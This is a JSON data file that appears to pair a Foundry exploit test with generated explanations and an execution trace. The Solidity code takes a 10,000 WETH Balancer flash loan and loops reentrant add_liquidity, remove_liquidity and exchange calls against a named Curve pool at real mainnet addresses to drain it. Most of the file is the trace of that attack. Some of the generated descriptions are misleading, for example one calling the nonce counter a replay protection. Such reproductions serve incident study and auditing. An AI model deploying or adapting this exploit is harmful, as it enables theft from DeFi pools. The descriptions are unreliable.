@@ -1,0 +1,4454 @@
+[
+    {
+        "id": "14195974",
+        "args": "",
+        "original_code": "    function testExploit() external {\n        deal(address(this), 0);\n        CRV.approve(address(CurvePool), type(uint256).max);\n        address[] memory tokens = new address[](1);\n        tokens[0] = address(WETH);\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = 10_000 ether;\n        bytes memory userData = \"\";\n        Balancer.flashLoan(address(this), tokens, amounts, userData);\n\n        emit log_named_decimal_uint(\n            \"Attacker WETH balance after exploit\", WETH.balanceOf(address(this)), WETH.decimals()\n        );\n    }\n\n",
+        "description": "1. Core functions:  \nThe `testExploit` function is designed to simulate an exploit scenario. It performs a series of actions, including setting up a transaction, approving a maximum allowance for a specific token, and executing a flash loan from a Balancer pool. The function then logs the attacker's balance of WETH (Wrapped Ether) after the exploit is executed.  \n\n2. Security mechanism:  \nThe function does not explicitly include security mechanisms like access control or input validation. However, it uses the `deal` function to reset the contract's balance to zero, which could be a precautionary step to ensure a clean state before the exploit. The use of `type(uint256).max` for approval ensures that the maximum possible allowance is granted, which is a common practice in token interactions but could pose risks if not handled carefully.  \n\n3. Parameter Function:  \n- `tokens`: An array of token addresses, in this case, containing only WETH.  \n- `amounts`: An array of amounts to borrow in the flash loan, set to 10,000 ether for WETH.  \n- `userData`: Additional data passed to the flash loan, left empty in this case.  \nThese parameters define the details of the flash loan, specifying which token to borrow and how much.  \n\n4. Return description:  \nThe function does not return a value directly. Instead, it emits an event (`log_named_decimal_uint`) that logs the attacker's WETH balance after the exploit. The balance is calculated by calling `WETH.balanceOf(address(this))`, which retrieves the WETH balance of the contract executing the function.  \n\nIn summary,  \nThe `testExploit` function simulates an exploit by setting up a flash loan for 10,000 WETH and logging the resulting balance. It lacks explicit security measures but ensures a clean state before execution. The parameters define the flash loan details, and the function emits an event to display the attacker's WETH balance after the exploit.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "24768",
+        "args": "CurvePool: [0x8301AE4fc9c624d1D396cbDAa1ed877821D7C511], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "14143443",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], [10000000000000000000000 [1e22]], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2534",
+        "args": "Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "85248028035718445004044 [8.524e22]"
+    },
+    {
+        "id": "2350",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "27962",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10000000000000000000000 [1e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "14089634",
+        "args": "[0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], [10000000000000000000000 [1e22]], [0], 0x",
+        "original_code": "    function receiveFlashLoan(\n        address[] memory tokens,\n        uint256[] memory amounts,\n        uint256[] memory feeAmounts,\n        bytes memory userData\n    ) external {\n        WETH.withdraw(WETH.balanceOf(address(this)));\n\n        for (uint256 i; i < 20; ++i) {\n            uint256[2] memory amount;\n            amount[0] = 400 ether;\n            amount[1] = 0;\n            CurvePool.add_liquidity{value: 400 ether}(amount, 0, true); // add liquidity\n\n            amount[0] = 0;\n            CurvePool.remove_liquidity(LP.balanceOf(address(this)), amount, true); // reentrancy enter point\n            nonce++;\n\n            CurvePool.remove_liquidity_one_coin(LP.balanceOf(address(this)), 0, 0, true); // remove liquidity to get eth\n            nonce++;\n\n            CurvePool.exchange(1, 0, CRV.balanceOf(address(this)), 0, true); // swap crv to eth\n            nonce++;\n        }\n\n        WETH.deposit{value: address(this).balance}();\n\n        WETH.transfer(address(Balancer), amounts[0] + feeAmounts[0]);\n    }\n\n",
+        "description": "1. **Core functions**:  \n   This function is designed to handle a flash loan, which is a type of short-term loan where borrowed funds must be returned within the same transaction. The function first withdraws WETH (Wrapped Ether) from the contract's balance. It then performs a series of operations in a loop, including adding liquidity to a Curve pool, removing liquidity, swapping tokens, and exchanging CRV tokens for ETH. Finally, it deposits the remaining ETH back into WETH and repays the flash loan along with a fee to the Balancer contract.\n\n2. **Security mechanism**:  \n   The function includes a `nonce` counter that increments after certain operations, which could be used to track the sequence of actions and prevent replay attacks. The use of `{value: ...}` ensures that the correct amount of ETH is sent during transactions. However, the function does not explicitly include reentrancy guards, which could be a vulnerability since it interacts with external contracts like CurvePool and Balancer. Proper checks and safeguards should be added to prevent potential reentrancy attacks.\n\n3. **Parameter Function**:  \n   - `tokens`: An array of token addresses involved in the flash loan.  \n   - `amounts`: An array of amounts corresponding to the tokens borrowed in the flash loan.  \n   - `feeAmounts`: An array of fee amounts that need to be paid back along with the borrowed amounts.  \n   - `userData`: Additional data that can be passed to the function for custom logic or configurations.  \n\n4. **Return description**:  \n   The function does not return any value. Its primary purpose is to execute a series of operations within a flash loan transaction, including liquidity management, token swaps, and repayment of the loan with fees. The final step ensures that the borrowed amount and fees are transferred back to the Balancer contract.  \n\n**In summary**, this function manages a flash loan by performing liquidity operations, token swaps, and repayment. It lacks explicit reentrancy protection, which could be a security concern. The parameters define the tokens, amounts, fees, and additional data involved in the transaction, and the function does not return any value.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "534",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "10000000000000000000000 [1e22]"
+    },
+    {
+        "id": "9387",
+        "args": "10000000000000000000000 [1e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "247",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "211009",
+        "args": "[400000000000000000000 [4e20], 0], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "9804781276038197494266 [9.804e21]"
+    },
+    {
+        "id": "2624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "29539",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 9804781276038197494266 [9.804e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "560152968442800712825618 [5.601e23]"
+    },
+    {
+        "id": "683",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "9804781276038197494266 [9.804e21]"
+    },
+    {
+        "id": "372122",
+        "args": "9804781276038197494266 [9.804e21], [0, 0], true",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "560152968442800712825618 [5.601e23]"
+    },
+    {
+        "id": "2879",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 9804781276038197494266 [9.804e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "331262",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "135195",
+        "args": "[400000000000000000000 [4e20], 0], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "4674137982165061263643 [4.674e21]"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "25539",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4674137982165061263643 [4.674e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "555022325148927576594995 [5.55e23]"
+    },
+    {
+        "id": "176425",
+        "args": "0, 1, 500000000000000000000 [5e20], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "1212778211030628140712402 [1.212e24]"
+    },
+    {
+        "id": "29681",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1212778211030628140712402 [1.212e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "555022325148927576594995 [5.55e23]"
+    },
+    {
+        "id": "2981",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 517589044137308670008753 [5.175e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "683",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "4674137982165061263643 [4.674e21]"
+    },
+    {
+        "id": "131134",
+        "args": "4674137982165061263643 [4.674e21], 0, 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000030a093f5c4d1223b4e"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "555022325148927576594995 [5.55e23]"
+    },
+    {
+        "id": "2879",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4674137982165061263643 [4.674e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "535",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "930",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1730367255167936810721155 [1.73e24]"
+    },
+    {
+        "id": "136709",
+        "args": "1, 0, 1730367255167936810721155 [1.73e24], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "639895871132465319144 [6.398e20]"
+    },
+    {
+        "id": "3442",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], CurvePool: [0x8301AE4fc9c624d1D396cbDAa1ed877821D7C511], 1730367255167936810721155 [1.73e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "535",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "124393",
+        "args": "[400000000000000000000 [4e20], 0], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "10008213593145172932918 [1e22]"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "25539",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10008213593145172932918 [1e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "560356400759907688264270 [5.603e23]"
+    },
+    {
+        "id": "683",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "10008213593145172932918 [1e22]"
+    },
+    {
+        "id": "323363",
+        "args": "10008213593145172932918 [1e22], [0, 0], true",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "560356400759907688264270 [5.603e23]"
+    },
+    {
+        "id": "2879",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10008213593145172932918 [1e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "284503",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "107269",
+        "args": "[400000000000000000000 [4e20], 0], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "4871642563153650867777 [4.871e21]"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "25539",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4871642563153650867777 [4.871e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "555219829729916166199129 [5.552e23]"
+    },
+    {
+        "id": "159592",
+        "args": "0, 1, 500000000000000000000 [5e20], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "1308366409987184598326246 [1.308e24]"
+    },
+    {
+        "id": "25681",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1308366409987184598326246 [1.308e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "555219829729916166199129 [5.552e23]"
+    },
+    {
+        "id": "2981",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 549797076408276386243404 [5.497e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "683",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "4871642563153650867777 [4.871e21]"
+    },
+    {
+        "id": "123850",
+        "args": "4871642563153650867777 [4.871e21], 0, 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000030a4f7b6d6fe1b40c6"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "555219829729916166199129 [5.552e23]"
+    },
+    {
+        "id": "2879",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4871642563153650867777 [4.871e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "535",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "930",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1858163486395460984569650 [1.858e24]"
+    },
+    {
+        "id": "152765",
+        "args": "1, 0, 1858163486395460984569650 [1.858e24], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "642698266723627951543 [6.426e20]"
+    },
+    {
+        "id": "3442",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], CurvePool: [0x8301AE4fc9c624d1D396cbDAa1ed877821D7C511], 1858163486395460984569650 [1.858e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "535",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "135253",
+        "args": "[400000000000000000000 [4e20], 0], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "10456500457033694756885 [1.045e22]"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "25539",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10456500457033694756885 [1.045e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "560804687623796210088237 [5.608e23]"
+    },
+    {
+        "id": "683",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "10456500457033694756885 [1.045e22]"
+    },
+    {
+        "id": "302281",
+        "args": "10456500457033694756885 [1.045e22], [0, 0], true",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "560804687623796210088237 [5.608e23]"
+    },
+    {
+        "id": "2879",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10456500457033694756885 [1.045e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "263421",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "135253",
+        "args": "[400000000000000000000 [4e20], 0], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "5051768745028818748172 [5.051e21]"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "25539",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5051768745028818748172 [5.051e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "555399955911791334079524 [5.553e23]"
+    },
+    {
+        "id": "110526",
+        "args": "0, 1, 500000000000000000000 [5e20], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "1377218493484260449114853 [1.377e24]"
+    },
+    {
+        "id": "25681",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1377218493484260449114853 [1.377e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "555399955911791334079524 [5.553e23]"
+    },
+    {
+        "id": "2981",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 598359541437458171210379 [5.983e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "683",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "5051768745028818748172 [5.051e21]"
+    },
+    {
+        "id": "134466",
+        "args": "5051768745028818748172 [5.051e21], 0, 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000030ae36867894c69e4b"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "555399955911791334079524 [5.553e23]"
+    },
+    {
+        "id": "2879",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5051768745028818748172 [5.051e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "535",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "930",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1975578034921718620325232 [1.975e24]"
+    },
+    {
+        "id": "160920",
+        "args": "1, 0, 1975578034921718620325232 [1.975e24], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "626392874235700742676 [6.263e20]"
+    },
+    {
+        "id": "3442",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], CurvePool: [0x8301AE4fc9c624d1D396cbDAa1ed877821D7C511], 1975578034921718620325232 [1.975e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "535",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "140825",
+        "args": "[400000000000000000000 [4e20], 0], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "10913015575173609207096 [1.091e22]"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "25539",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10913015575173609207096 [1.091e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "561261202741936124538448 [5.612e23]"
+    },
+    {
+        "id": "683",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "10913015575173609207096 [1.091e22]"
+    },
+    {
+        "id": "356967",
+        "args": "10913015575173609207096 [1.091e22], [0, 0], true",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "561261202741936124538448 [5.612e23]"
+    },
+    {
+        "id": "2879",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10913015575173609207096 [1.091e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "318107",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "140825",
+        "args": "[400000000000000000000 [4e20], 0], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "5258748123728099896241 [5.258e21]"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "25539",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5258748123728099896241 [5.258e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "555606935290490615227593 [5.556e23]"
+    },
+    {
+        "id": "159640",
+        "args": "0, 1, 500000000000000000000 [5e20], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "1493663803642509441193537 [1.493e24]"
+    },
+    {
+        "id": "25681",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1493663803642509441193537 [1.493e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "555606935290490615227593 [5.556e23]"
+    },
+    {
+        "id": "2981",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 650753358052818750153711 [6.507e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "683",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "5258748123728099896241 [5.258e21]"
+    },
+    {
+        "id": "139840",
+        "args": "5258748123728099896241 [5.258e21], 0, 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000030a1984f47de5bf3dd"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "555606935290490615227593 [5.556e23]"
+    },
+    {
+        "id": "2879",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5258748123728099896241 [5.258e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "535",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "930",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "2144417161695328191347248 [2.144e24]"
+    },
+    {
+        "id": "161754",
+        "args": "1, 0, 2144417161695328191347248 [2.144e24], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "623579023096892900715 [6.235e20]"
+    },
+    {
+        "id": "3442",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], CurvePool: [0x8301AE4fc9c624d1D396cbDAa1ed877821D7C511], 2144417161695328191347248 [2.144e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "535",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "146245",
+        "args": "[400000000000000000000 [4e20], 0], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "11399890172634143148005 [1.139e22]"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "25539",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 11399890172634143148005 [1.139e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "561748077339396658479357 [5.617e23]"
+    },
+    {
+        "id": "683",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "11399890172634143148005 [1.139e22]"
+    },
+    {
+        "id": "370476",
+        "args": "11399890172634143148005 [1.139e22], [0, 0], true",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
